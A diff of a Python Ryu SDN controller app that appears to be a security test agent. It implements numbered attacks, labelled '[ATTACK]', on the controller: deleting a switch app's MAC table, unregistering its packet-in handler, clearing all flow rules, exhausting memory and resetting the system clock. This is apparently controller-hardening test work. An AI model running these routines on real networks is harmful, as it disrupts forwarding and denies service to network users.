@@ -8,7 +8,6 @@ from ryu.lib.packet import packet
 from ryu.lib.packet import ethernet
 from ryu.controller import dpset
 from ryu.ofproto import ofproto_v1_3
-from ryu.controller import conf_switch
 import sys, os
 import array
 import itertools
@@ -16,16 +15,15 @@ import itertools
 class AppAgent13(app_manager.RyuApp):
     OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
     _CONTEXTS = {
-        'dpset': dpset.DPSet,
-        'switchset': conf_switch.ConfSwitchSet
+        'dpset': dpset.DPSet
     }
 
     def __init__(self, *args, **kwargs):
         super(AppAgent13, self).__init__(*args, **kwargs)
         self.dpset = kwargs['dpset']
-        self.switchset = kwargs['switchset']
         self.drop = 0
         self.clear = 0
+        #self.abuse = 0
         self.msg = None
 
         # Run AMInterface Thread
@@ -36,17 +34,19 @@ class AppAgent13(app_manager.RyuApp):
         self.logger.info("[App-Agent] Starting AppAgent on Ryu")
 
     # 3.1.020
+    # TODO: unchained structure
     def testControlMessageDrop(self):
         self.logger.info("[ATTACK] Start Control Message Drop")
-        self.drop = 1
+        #self.drop = 1
+        return "Drop Packet"
 
     # 3.1.020 drop
-    # TODO: unchained structure
     def callControlMessageDrop(self):
         pkt = packet.Packet(self.msg.data)
         eth = pkt.get_protocols(ethernet.ethernet)[0]
         self.logger.info("Drop Packet Info: ")
         self.logger.info(str(eth) + "\n")
+
 
     # 3.1.030
     def testInfiniteLoops(self):
@@ -64,11 +64,24 @@ class AppAgent13(app_manager.RyuApp):
                 i = 0
 
     # 3.1.040
-    # TODO:
+    # TODO: Maybe no Internal Storage in RYU, My test result is fail.
     def testInternalStorageAbuse(self):
-        self.logger.info("testInternalStorageAbuse")
-        for dp in self.dpset.dps.values():
-            self.switchset.del_dpid(dp.id)
+        self.logger.info("[ATTACK] Start Internal Storage Abuse")
+        app_name = "SimpleSwitch13"
+        app_mgr = app_manager.AppManager.get_instance()
+        del app_mgr.applications[app_name].mac_to_port
+        return "All of datapath"
+
+#        self.callInternalStorageAbuse()
+#        self.abuse = 1
+#        return "All of Datapath"
+
+#    def callInternalStorageAbuse(self):
+#        app_name = "SimpleSwitch13"
+#        app_mgr = app_manager.AppManager.get_instance()
+#        for dp in self.dpset.dps.values():
+#            del app_mgr.applications[app_name].mac_to_port[dp.id]
+#        self.logger.info("Pass")
 
     # 3.1.070
     def testFlowRuleModification(self):
@@ -100,14 +113,22 @@ class AppAgent13(app_manager.RyuApp):
             match = dp.ofproto_parser.OFPMatch()
             flow_mod = dp.ofproto_parser.OFPFlowMod(datapath=dp, match=match, cookie=0,
                                                     out_port=dp.ofproto.OFPP_ANY,
+
                                                     out_group=dp.ofproto.OFPG_ANY,
                                                     command=dp.ofproto.OFPFC_DELETE)
             dp.send_msg(flow_mod)
 
     # 3.1.090
-    # TODO:
     def testEventListenerUnsubscription(self):
         self.logger.info("[ATTACK] Event Listener Unsubscription")
+        app_name = "SimpleSwitch13"
+        app_mgr = app_manager.AppManager.get_instance()
+        ev_c, state_c = app_mgr.applications[app_name].events.get()
+        handlers = app_mgr.applications[app_name].get_handlers(ev_c, state_c)
+        for handler in handlers:
+            if "_packet_in_handler" in str(handler):
+                app_mgr.applications[app_name].unregister_handler(ofp_event.EventOFPPacketIn, handler)
+        return "EventOFPPacketIn Message"
 
     # 3.1.100
     def testApplicationEviction(self):
@@ -118,6 +139,7 @@ class AppAgent13(app_manager.RyuApp):
         return app_name
 
     # 3.1.110
+    # TODO: this result is pass. why?, My test result is fail.
     def testMemoryExhaustion(self):
         self.logger.info("[ATTACK] Memory Exhaustion")
         array.array('B', itertools.repeat(0, sys.maxint))
@@ -136,7 +158,7 @@ class AppAgent13(app_manager.RyuApp):
             x = x + 1
 
     # 3.1.130
-    # TODO: This is PASS, it that true?
+    # TODO: permission problem
     def testSystemVariableManipulation(self):
         self.logger.info("[ATTACK] System Variable Manipulation")
         os.system("date -s '1 JAN 1999'")
@@ -170,6 +192,8 @@ class AppAgent13(app_manager.RyuApp):
             self.callControlMessageDrop()
         if self.clear:
             self.callFlowTableClearance()
+        #if self.abuse:
+            #self.callInternalStorageAbuse()
 
 if __name__ == "__main__":
     a = AppAgent13()
